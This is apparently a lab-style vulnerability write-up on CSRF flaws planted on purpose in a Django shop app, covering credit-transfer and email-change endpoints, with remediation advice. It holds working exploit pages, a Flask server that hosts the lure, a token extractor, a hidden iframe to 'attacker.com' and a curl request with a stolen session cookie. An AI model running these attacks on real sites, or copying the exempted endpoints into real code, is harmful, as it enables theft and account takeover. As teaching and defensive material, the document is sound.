# Cross-Site Request Forgery (CSRF) Vulnerability Documentation

## Vulnerability Overview
**Type**: Cross-Site Request Forgery (CSRF)  
**Locations**: Multiple endpoints with `@csrf_exempt` decorator  
**Files**: `eshop/views.py` - `transfer_credits` (lines 1073-1107), `update_user_email` (lines 1112-1132)  
**Severity**: High  
**OWASP Category**: A01:2021 â€“ Broken Access Control  
**CWE**: CWE-352 - Cross-Site Request Forgery  

## Technical Details

### Vulnerable Endpoints

#### 1. Credit Transfer Endpoint
```python
@login_required
@csrf_exempt  # VULNERABILITY: CSRF protection disabled
def transfer_credits(request):
    """
    Transfer store credits between users - VULNERABLE TO CSRF
    
    WARNING: CSRF protection is disabled on this endpoint
    Allows malicious sites to perform transfers on behalf of logged-in users
    """
    if request.method == 'POST':
        recipient_username = request.POST.get('recipient')
        amount = request.POST.get('amount')
        
        # VULNERABILITY: No confirmation or additional authentication
        # Transfers happen immediately without user confirmation
```

#### 2. Email Update Endpoint
```python
@login_required  
@csrf_exempt  # VULNERABILITY: CSRF protection disabled
def update_user_email(request):
    """
    Update user email - VULNERABLE TO CSRF
    
    WARNING: No CSRF protection and no email verification
    """
    if request.method == 'POST':
        new_email = request.POST.get('email')
        
        # VULNERABILITY: No email verification
        # Changes email immediately without confirmation
        request.user.email = new_email
        request.user.save()
```

### Vulnerability Explanation
1. **CSRF Protection Disabled**: `@csrf_exempt` decorator removes Django's CSRF protection
2. **No Additional Verification**: Actions execute immediately without confirmation
3. **State-Changing Operations**: Both endpoints modify user data
4. **No Anti-CSRF Tokens**: Forms lack CSRF tokens

## Exploitation Steps

### 1. Basic CSRF Attack Page

Create a malicious HTML page that victims would visit:

```html
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Congratulations! You've won â‚¬1000!</h1>
    <p>Click below to claim your prize...</p>
    
    <!-- Hidden CSRF attack forms -->
    
    <!-- Transfer credits silently -->
    <form id="csrf-transfer" action="http://localhost:8000/transfer-credits/" method="POST">
        <input type="hidden" name="recipient" value="attacker">
        <input type="hidden" name="amount" value="999.99">
    </form>
    
    <!-- Change email silently -->
    <form id="csrf-email" action="http://localhost:8000/update-email/" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    
    <script>
        // Auto-submit forms when page loads
        window.onload = function() {
            document.getElementById('csrf-transfer').submit();
            // Delay second attack to avoid suspicion
            setTimeout(function() {
                document.getElementById('csrf-email').submit();
            }, 1000);
        }
    </script>
</body>
</html>
```

### 2. Advanced CSRF with AJAX

```html
<!DOCTYPE html>
<html>
<head>
    <title>Tech Blog</title>
</head>
<body>
    <h1>Latest Tech News</h1>
    <p>Reading this article performs CSRF attacks in background...</p>
    
    <script>
        // CSRF via AJAX (works if server accepts)
        function csrfAttack() {
            // Attack 1: Transfer credits
            var xhr1 = new XMLHttpRequest();
            xhr1.open('POST', 'http://localhost:8000/transfer-credits/', true);
            xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr1.send('recipient=evil_hacker&amount=500');
            
            // Attack 2: Change email
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'http://localhost:8000/update-email/', true);
            xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr2.send('email=pwned@attacker.com');
        }
        
        // Execute after page loads
        setTimeout(csrfAttack, 500);
    </script>
</body>
</html>
```

### 3. Image Tag CSRF (GET Requests)

```html
<!-- If the endpoint accepted GET requests -->
<img src="http://localhost:8000/transfer-credits/?recipient=attacker&amount=100" 
     style="display:none">

<!-- Multiple attacks via images -->
<img src="http://localhost:8000/update-email/?email=stolen@evil.com" 
     style="display:none">
```

## Proof of Concept Scripts

### 1. CSRF Attack Server
```python
#!/usr/bin/env python3
"""
CSRF Attack Server - Hosts malicious pages
"""

from flask import Flask, render_template_string
import sys

app = Flask(__name__)

CSRF_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone 15 - Click Here!</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .prize { 
            background: linear-gradient(45deg, gold, orange);
            padding: 20px;
            text-align: center;
            border-radius: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="prize" onclick="claimPrize()">
        <h1>ðŸŽ‰ You're Our 1,000,000th Visitor! ðŸŽ‰</h1>
        <h2>Click to Claim Your Free iPhone 15!</h2>
    </div>
    
    <!-- CSRF Attack Forms -->
    <div style="display:none">
        <form id="transfer" action="{{ target }}/transfer-credits/" method="POST">
            <input name="recipient" value="{{ attacker }}">
            <input name="amount" value="{{ amount }}">
        </form>
        
        <form id="email" action="{{ target }}/update-email/" method="POST">
            <input name="email" value="{{ email }}">
        </form>
    </div>
    
    <script>
        var attacked = false;
        
        function claimPrize() {
            if (!attacked) {
                attacked = true;
                
                // Submit CSRF forms
                document.getElementById('transfer').submit();
                
                setTimeout(function() {
                    document.getElementById('email').submit();
                }, 500);
                
                alert('Processing your prize...');
            }
        }
        
        // Auto-attack after 2 seconds
        setTimeout(function() {
            if (!attacked) {
                claimPrize();
            }
        }, 2000);
    </script>
</body>
</html>
"""

@app.route('/')
def csrf_attack():
    return render_template_string(CSRF_TEMPLATE,
        target='http://localhost:8000',
        attacker='evil_hacker',
        amount='999.99',
        email='stolen@attacker.com'
    )

if __name__ == '__main__':
    print("[*] Starting CSRF attack server...")
    print("[*] Send victims to: http://localhost:5000")
    print("[!] Victims must be logged into the target site")
    app.run(port=5000)
```

### 2. CSRF Token Extractor (If Site Had Weak Implementation)
```python
#!/usr/bin/env python3
"""
CSRF Token Extraction - For sites with predictable tokens
"""

import requests
import re
from bs4 import BeautifulSoup

def extract_csrf_token(html):
    """Extract CSRF token from HTML"""
    # Look for common CSRF token patterns
    patterns = [
        r'csrfmiddlewaretoken["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
        r'name=["\']csrf_token["\'].*?value=["\']([^"\']+)',
        r'csrf_token["\']?\s*:\s*["\']([^"\']+)',
        r'X-CSRFToken["\']?\s*:\s*["\']([^"\']+)'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    
    # Try BeautifulSoup
    soup = BeautifulSoup(html, 'html.parser')
    token_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    if token_input:
        return token_input.get('value')
    
    return None

def demo_csrf_with_token_theft():
    """Demonstrate CSRF even with tokens (if predictable)"""
    
    # This wouldn't work on our vulnerable app since CSRF is disabled
    # But shows how CSRF can still happen with weak token implementation
    
    session = requests.Session()
    
    # Get login page to steal CSRF token
    login_page = session.get('http://localhost:8000/login/')
    csrf_token = extract_csrf_token(login_page.text)
    
    if csrf_token:
        print(f"[+] Extracted CSRF token: {csrf_token}")
        
        # Use stolen token in attack
        attack_data = {
            'csrfmiddlewaretoken': csrf_token,
            'recipient': 'attacker',
            'amount': '100'
        }
        
        # This would be embedded in malicious site
        print("[*] Attack payload:", attack_data)
```

## Attack Scenarios

### Scenario 1: Social Engineering Email
```
Subject: Your Amazon Order Has Shipped!

Dear Customer,

Your order #123456 has been shipped!
Track your package: http://evil-site.com/track

[Link hosts CSRF attack page]
```

### Scenario 2: Malicious Advertisement
```javascript
// Malicious ad network code
document.write('<iframe src="http://attacker.com/csrf.html" style="display:none"></iframe>');
```

### Scenario 3: Forum Post with Embedded Attack
```html
<!-- Forum post -->
<p>Check out this cool image!</p>
<img src="http://localhost:8000/transfer-credits/?recipient=attacker&amount=50">
```

## Impact Analysis

### Financial Impact
- **Credit Theft**: Transfer all user credits to attacker accounts
- **Financial Loss**: Direct monetary loss if credits have real value
- **Fraud**: Use stolen credits for purchases

### Account Takeover
- **Email Change**: Hijack account by changing email
- **Password Reset**: Use new email to reset password
- **Full Control**: Complete account takeover

### Data Manipulation
- **Profile Changes**: Modify user preferences
- **Order Manipulation**: Change shipping addresses
- **Privacy Breach**: Expose user data to attackers

## Remediation

### Immediate Fix
```python
# Remove @csrf_exempt decorator
@login_required
# @csrf_exempt  # REMOVED
def transfer_credits(request):
    # Add CSRF token to forms
    # Django will automatically validate
```

### Template Changes
```html
<!-- Add CSRF token to forms -->
<form method="post" action="{% url 'transfer_credits' %}">
    {% csrf_token %}
    <!-- form fields -->
</form>
```

### Additional Security Measures

1. **Implement Confirmation Step**
```python
def transfer_credits(request):
    if request.method == 'POST':
        if 'confirm' not in request.POST:
            # Show confirmation page
            return render(request, 'confirm_transfer.html', {...})
        else:
            # Process transfer with confirmation
            pass
```

2. **Add CAPTCHA for Sensitive Actions**
```python
from captcha.fields import ReCaptchaField

class TransferForm(forms.Form):
    recipient = forms.CharField()
    amount = forms.DecimalField()
    captcha = ReCaptchaField()
```

3. **Implement SameSite Cookie Attribute**
```python
SESSION_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_SAMESITE = 'Strict'
```

4. **Double Submit Cookie Pattern**
```javascript
// Include CSRF token in header
fetch('/transfer-credits/', {
    method: 'POST',
    headers: {
        'X-CSRFToken': getCookie('csrftoken'),
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
});
```

## Testing Tools

### Manual Testing
```bash
# Test CSRF with curl
curl -X POST http://localhost:8000/transfer-credits/ \
  -H "Cookie: sessionid=victim-session-id" \
  -d "recipient=attacker&amount=100"
```

### Automated Testing
```python
# Burp Suite CSRF PoC Generator
# 1. Intercept legitimate request
# 2. Right-click â†’ Engagement tools â†’ Generate CSRF PoC
# 3. Modify and test generated HTML
```

### OWASP ZAP Testing
```
1. Spider the application
2. Active Scan with CSRF checks enabled
3. Review alerts for CSRF vulnerabilities
```

## Prevention Checklist

- [ ] Enable CSRF protection globally
- [ ] Include `{% csrf_token %}` in all forms
- [ ] Use Django's CSRF middleware
- [ ] Set proper SameSite cookie attributes
- [ ] Implement user confirmation for sensitive actions
- [ ] Add CAPTCHA for high-value operations
- [ ] Use custom headers for AJAX requests
- [ ] Validate Referer header for sensitive operations

## References
- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [Django CSRF Protection](https://docs.djangoproject.com/en/4.0/ref/csrf/)
- [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)